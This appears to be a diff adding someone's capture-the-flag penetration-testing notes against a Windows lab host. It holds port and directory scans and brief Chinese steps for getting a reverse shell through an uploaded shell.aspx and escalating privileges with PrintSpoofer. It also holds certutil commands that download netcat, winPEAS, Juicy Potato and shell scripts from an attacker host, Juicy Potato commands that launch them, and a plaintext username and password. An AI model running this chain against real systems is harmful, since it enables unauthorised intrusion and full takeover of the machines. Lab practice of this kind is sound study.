@@ -1,0 +1,55 @@
+nmap -sV -sC -Pn 10.10.104.203 > nmap.txt
+nmap -p- 10.10.104.203 > nmapall.txt
+gobuster dir  -u http://10.10.104.203/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php,cgi  > gobuster.txt
+gobuster dir  -u http://10.10.104.203:49663/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php,cgi  > gobuster49663.txt
+gobuster dir  -u http://10.10.104.203:49666/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php,cgi  > gobuster49666.txt
+gobuster dir  -u http://10.10.104.203:49668/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php,cgi  > gobuster49668.txt
+gobuster dir  -u http://10.10.60.113:49663/aspnet_client/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php,cgi  > gobuster49663aspnet_client.txt
+gobuster dir  -u http://10.10.60.113:49663/aspnet_client/system_web/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php,cgi  > gobuster49663system_web.txt
+
+
+
+nmap --script vuln -sV -p 135,80,139,445,80,49663,49666,49668 -Pn  10.10.104.203  > nmapvuln.txt
+1.nmap掃描出來有80端口及samba,samba可以查看到帳號密碼
+2.nmap掃描全端口發現有49663,49666,49668
+3.49663可以訪問使用medium字典掃可以找到
+http://10.10.180.189:49663/nt4wrksv
+4.發現這個路徑是samba路徑,可以上傳shell.aspx取得reverse (必須要aspx檔案,asp不生效)
+5.使用printSpoofer64.exe可以取得root
+PrintSpoofer64.exe -i -c powershell
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File startprocess1.ps1
+
+
+certutil.exe -urlcache -split -f http://10.9.0.204/nc64.exe nc64.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/startprocess.ps1 startprocess.ps1
+certutil.exe -urlcache -split -f http://10.9.0.204/winPEAS.exe winPEAS.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/shell.bat shell.bat
+certutil.exe -urlcache -split -f http://10.9.0.204/Juicy.Potato.x86.exe Juicy.Potato.x86.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/GetCLSID.ps1 GetCLSID.ps1
+certutil.exe -urlcache -split -f http://10.9.0.204/shelljc.bat shelljc.bat
+certutil.exe -urlcache -split -f http://10.9.0.204/PrintSpoofer64.exe PrintSpoofer64.exe
+
+powershell -executionpolicy bypass -file GetCLSID.ps1 > clsid.txt
+
+c:\Users\Bob\Desktop\MSFRottenPotato.exe * c:\Users\Bob\Desktop\shell.bat
+
+Juicy.Potato.x86.exe -t t -p c:\Users\Bob\Desktop\nc64.exe -l 5555 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
+
+Juicy.Potato.x86.exe -p c:\Users\Bob\Desktop\nc64.exe -l 5555 -t * -c "{0134A8B2-3407-4B45-AD25-E9F7C92A80BC}"
+Juicy.Potato.x86.exe  -t * -p c:\Users\Bob\Desktop\shelljc.bat -l 444
+
+Enum4linux -u SVC_TGS -p GPPstillStandingStrong2k18 -a active.htb
+
+nikto -h http://10.10.253.1:49663 > nikto.txt
+
+davtest -url http://10.10.104.203
+
+
+sudo apt-get install freerdp2-x11
+xfreerdp /u:"administrator" /v:my.server.net:61220
+
+
+
+
+
